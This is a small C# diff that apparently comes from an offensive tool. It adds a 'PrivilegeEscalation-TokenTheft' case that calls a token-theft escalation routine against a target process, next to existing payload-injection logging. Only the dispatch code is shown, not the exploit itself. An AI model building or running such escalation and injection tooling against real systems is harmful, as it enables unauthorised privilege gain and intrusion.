@@ -33,6 +33,10 @@ namespace Mabean.Services
                     Console.WriteLine(code3);
                     LoggerService.Write($"[+] Injected payload into process with PUID: {puid} with return code: {code3}");
                     break;
+                case "PrivilegeEscalation-TokenTheft":
+                    var code4 = InteropPrivilegeEscalation.TokenTheftEscalation(puid);
+                    LoggerService.Write($"[+] Performed token theft escalation into process with PUID: {puid} with return code: {code4}");
+                    break;
             }
         }
     }
